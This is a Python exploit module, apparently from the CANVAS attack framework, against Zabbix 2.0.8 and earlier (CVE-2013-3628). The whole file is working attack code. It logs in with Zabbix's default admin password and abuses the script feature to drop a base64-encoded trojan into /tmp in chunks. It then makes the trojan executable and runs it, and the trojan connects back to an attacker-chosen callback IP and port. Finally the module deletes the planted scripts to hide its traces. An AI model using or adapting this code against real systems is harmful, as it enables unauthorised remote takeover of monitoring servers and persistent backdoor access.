#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2012
#http://www.immunityinc.com/CANVAS/ for more information

# python imports
import sys
import base64
import string
import urllib2
import random

# path appends
if '.' not in sys.path:
    sys.path.append('.')

# CANVAS imports
import canvasengine
import libs.spkproxy as spkproxy

from phplistener import get_php_stage1
from tcpexploit import tcpexploit
from libs.canvasos import *
from exploitutils import *

NAME="Zabbix <= 2.0.8 PHP File inclusion exploit"
DESCRIPTION="Zabbix <= 2.0.8 PHP File inclusion exploit"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Zabbix"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2013-3628"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2013-3628"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "Windows"] ]
PROPERTY['VERSION'] = [ "<= 2.0.8" ]

NOTES="""

"""

CHANGELOG="""

"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port = ""
        self.host = ""
        self.badstring = ""
        self.done = 0
        self.name = NAME
        self.basicauth_user = ""
        self.basicauth_password = ""
        self.shellcode = ""

        return

    def usage(self):
        print "Base options:"
        print "-v <version> -t <target ip> -l <callback ip> -d <callback port>"
        print "-O basepath:basepath -O basicauth_user:username -O basicauth_password:password -O port:port"
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))

        self.basicauth_user = self.argsDict.get("basicauth_user", self.basicauth_user)
        self.basicauth_password = self.argsDict.get("basicauth_password", self.basicauth_password)

        if self.port == '':
            self.usage()
            sys.exit(1)

        return

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def check(self):
        u = "http://" + self.host + ":" + str(self.port) + "/zabbix/index.php"

        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders="", data="", exploit=self, entireresponse=True, return_response_code=True, verb="GET")
            response = res.read()
            import re
            exp = re.search("Zabbix .* Copyright", response)
            version = exp.group(0).strip()[6:-9].strip()
            if version < "2.0.0" or version > "2.0.8":
                return 1
        except Exception:
            return 1
        return 0

    def auth(self):
        POSTDATA = urllib2.quote("request=&name=Admin&password=zabbix&autologin=1&enter=Sign+in", '=&+')

        exheaders = [("Cookie", "PHPSESSID=7d95otdcqcv1aq35hhg8m1ds77"),("Content-Type", "application/x-www-form-urlencoded"),("Connection", "keep-alive")]

        u = "http://" + self.host + ":" + str(self.port) + "/zabbix/index.php"

        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, data=POSTDATA, exploit=self, entireresponse=True, return_response_code=True, verb="POST")
            response = res.read()
            # Lets take the PHPSESSID of the login_response
            sid = response.split("Set-Cookie: ")[1].split("\n")[0]
            if ";" in sid:
                sid = sid.split(";")[0]
            if responsecode == 302: return sid
        except Exception:
            pass

    def create_script(self, sid, script, name):
        name = random.sample(string.letters,random.randint(5,10))
        name = ''.join(name)

        POSTDATA = urllib2.quote("sid=" + sid[30:] + "&form_refresh=9&form=Create+script&form_refresh=9&name=" + name + "&type=0&execute_on=1&command=" + script + "&commandipmi=&description=&usrgrpid=0&groupid=0&access=2&save=Save", '=&\\')

        exheaders = [("Content-Type", "application/x-www-form-urlencoded"),("Cookie", "PHPSESSID=7d95otdcqcv1aq35hhg8m1ds77; " + sid + "; cb_/zabbix/scripts.php_parts=0"),("Connection", "keep-alive")]

        u = "http://" + self.host + ":" + str(self.port) + "/zabbix/scripts.php"

        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, data=POSTDATA, exploit=self, entireresponse=True, return_response_code=True, verb="POST")
            response = res.read()
            scriptid = response.split(name)[0].split("scriptid=")[-1].split("&")[0]
            if responsecode == 200: return scriptid
        except Exception:
            pass

    def create_host(self,sid):
        name = random.sample(string.letters,random.randint(5,10))
        name = ''.join(name)

        POSTDATA = urllib2.quote("sid=" + sid[30:] + "&form_refresh=1&form=Create+host&host=" + name + "&visiblename=" + name + "&groups_left=100&newgroup=&interfaces%5B1%5D%5BisNew%5D=true&interfaces%5B1%5D%5Binterfaceid%5D=1&interfaces%5B1%5D%5Btype%5D=1&interfaces%5B1%5D%5Bip%5D=127.0.0.1&interfaces%5B1%5D%5Bdns%5D=&interfaces%5B1%5D%5Buseip%5D=1&interfaces%5B1%5D%5Bport%5D=10050&mainInterfaces%5B1%5D=1&proxy_hostid=0&status=0&ipmi_authtype=-1&ipmi_privilege=2&ipmi_username=&ipmi_password=&macros%5B0%5D%5Bmacro%5D=&macros%5B0%5D%5Bvalue%5D=&inventory_mode=-1&save=Save&groups%5B5%5D=5&groups%5B2%5D=2&groups%5B1%5D=1&groups%5B4%5D=4", '=&+%')

        exheaders = [("Content-Type", "application/x-www-form-urlencoded"),("Cookie", "PHPSESSID=7d95otdcqcv1aq35hhg8m1ds77; " + sid + "; cb_/zabbix/hosts.php_parts=0"),("Connection", "keep-alive")]

        u = "http://" + self.host + ":" + str(self.port) + "/zabbix/hosts.php"

        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, data=POSTDATA, exploit=self, entireresponse=True, return_response_code=True, verb="POST")
            response = res.read()
            hostid = response.split(name)[0].split("hostid=")[1].split("&")[0]
            if responsecode == 200: return hostid
        except Exception:
            pass

    def create_shellcode(self):
        t_os = canvasos("Linux")
        t_os.arch = "X86"
        ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=t_os, universal=True)
        return self.mosdeftrojan

    def execute_scripts(self, sid, scripts, hostid):
        for i in scripts:
            exheaders = [("Cookie", "PHPSESSID=7d95otdcqcv1aq35hhg8m1ds77; " + sid),("Connection", "keep-alive")]

            u = "http://" + self.host + ":" + str(self.port) + "/zabbix/scripts_exec.php?execute=1&hostid=" + hostid + "&scriptid=" + i + "&sid=" + sid[30:]

            try:
                (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, data="", exploit=self, entireresponse=True, return_response_code=True, verb="GET")
                response = res.read()
            except Exception:
                pass
        return 0

    def delete_scripts(self, sid, scripts):
        scripts_str = ""
        i = 0
        number_scripts = 0
        for item in scripts:
            scripts_str += "scripts%5B" + str(item) + "%5D=" + str(item) + "&"
            number_scripts += 1

        POSTDATA = urllib2.quote("sid=" + sid[30:] + "&form_refresh=1&" + scripts_str + "go=delete&goButton=Go+%28" + str(number_scripts) + "%29", '=&\\%')

        exheaders = [("Content-Type", "application/x-www-form-urlencoded"),("Cookie", "PHPSESSID=7d95otdcqcv1aq35hhg8m1ds77; " + sid + "; cb_/zabbix/scripts.php_parts=0"),("Connection", "keep-alive")]

        u = "http://" + self.host + ":" + str(self.port) + "/zabbix/scripts.php"

        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, data=POSTDATA, exploit=self, entireresponse=True, return_response_code=True, verb="POST")
            response = res.read()
            if responsecode == 200: return 0
        except Exception:
            pass

    def run(self):
        self.getargs()

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        self.log("Attacking %s:%d"%(self.host,self.port))
        self.log("Basic Auth User: %s"%self.basicauth_user)
        self.log("Basic Auth Password: %s"%self.basicauth_password)

        host_info = {}
        # set host info dict
        host_info['user'] = self.basicauth_user
        host_info['password'] = self.basicauth_password
        host_info['host'] = self.host
        host_info['port'] = self.port

        ret = self.check()
        if ret != 0:
            self.log("The target is not vulnerable to this exploit")
            return ret

        # Do an Auth
        sid = self.auth()

        self.shellcode = self.create_shellcode()
        import base64
        self.shellcode = base64.b64encode(self.shellcode).replace("=", "a")

        scripts = []
        name = ""
        ind = 200
        filename = random.sample(string.letters,random.randint(5,10))
        filename = ''.join(filename)
        script = "echo -n \"" + self.shellcode[:ind] + "\" | base64 --decode > /tmp/" + filename + ".bin"

        for i in range(0,30):
            scripts.append(self.create_script(sid, script, name))
            script = "echo -n \"" + self.shellcode[ind:ind+200] + "\" | base64 --decode >> /tmp/" + filename + ".bin"
            ind += 200
        script = "echo -n \"" + self.shellcode[6000:6132] + "\" | base64 --decode >> /tmp/" + filename + ".bin;chmod 0755 /tmp/" + filename + ".bin;./tmp/" + filename + ".bin"
        scripts.append(self.create_script(sid, script, name))

        hostid = self.create_host(sid)

        self.execute_scripts(sid, scripts, hostid)

        self.delete_scripts(sid, scripts)

        ret=self.ISucceeded()
        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))

        return ret

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)